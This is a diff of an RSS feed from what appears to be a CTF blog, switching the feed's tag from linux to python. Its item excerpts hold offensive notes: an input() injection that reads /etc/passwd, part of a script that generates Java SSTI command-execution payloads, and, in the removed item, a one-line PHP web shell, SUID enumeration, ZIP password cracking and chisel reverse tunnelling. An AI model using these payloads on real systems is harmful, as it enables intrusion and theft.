@@ -1,13 +1,13 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>linux on 53CTF</title>
-    <link>https://53ctf.github.io/tags/linux/</link>
-    <description>Recent content in linux on 53CTF</description>
+    <title>python on 53CTF</title>
+    <link>https://53ctf.github.io/tags/python/</link>
+    <description>Recent content in python on 53CTF</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-    <lastBuildDate>Sat, 07 Jan 2023 18:04:11 +0530</lastBuildDate><atom:link href="https://53ctf.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 07 Jan 2023 18:04:11 +0530</lastBuildDate><atom:link href="https://53ctf.github.io/tags/python/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Python</title>
       <link>https://53ctf.github.io/posts/2023/01/python/</link>
@@ -16,15 +16,6 @@
       <guid>https://53ctf.github.io/posts/2023/01/python/</guid>
       <description>Take Advantage Of input() Function And Run System Commands Within It __import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /etc/passwd&amp;#39;) Easy SSTI Payloads Generator GitHub
 #!/usr/bin/python3 from cmd import Cmd import urllib.parse, argparse parser = argparse.ArgumentParser(description=&amp;#34;Generate SSTI payloads... One character at a time.&amp;#34;) parser.add_argument(&amp;#34;-u&amp;#34;,&amp;#34;--url-encode&amp;#34;, action=&amp;#34;store_true&amp;#34;, help=&amp;#34;URL Encode&amp;#34;) args = parser.parse_args() url_encode=args.url_encode class Terminal(Cmd): prompt=&amp;#39;\033[1;33mCommand ==&amp;gt;\033[0m &amp;#39; def decimal_encode(self,args): command=args decimals=[] for i in command: decimals.append(str(ord(i))) payload=&amp;#39;&amp;#39;&amp;#39;${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&amp;#39;&amp;#39;&amp;#39; % decimals[0] for i in decimals[1:]: line=&amp;#39;.concat(T(java.lang.Character).toString({}))&amp;#39;.format(i) payload+=line payload+=&amp;#39;).getInputStream())}&amp;#39; if url_encode: payload_encoded=urllib.</description>
-    </item>
-    
-    <item>
-      <title>Linux Notes</title>
-      <link>https://53ctf.github.io/posts/2023/01/linux-notes/</link>
-      <pubDate>Sat, 07 Jan 2023 09:33:57 +0530</pubDate>
-      
-      <guid>https://53ctf.github.io/posts/2023/01/linux-notes/</guid>
-      <description>View Cron Jobs crontab -l List Scheduled Processes/Tasks/Scripts systemctl list-timers View NFS (Network File Share) showmount REMOTE_IP -e Mount NFS mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries find / -type f -perm -4000 2&amp;gt;/dev/null PHP WebShell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; SMB Shares smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding Server ./chisel server --reverse --port LOCAL_PORT Client ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports netstat -tupln OS/Kernel Information uname -a cat /proc/version cat /etc/issue CPU Information lscpu Identifying the Network Route route ip route Discover Other IP Address On A Network arp -a ip neigh Look For A Specific String In The File System grep --color=auto -rnw &amp;#39;/&amp;#39; -ie &amp;#34;STRING_THAT_WANT_BE_FOUND&amp;#34; --color=always 2&amp;gt; /dev/null find .</description>
     </item>
     
   </channel>
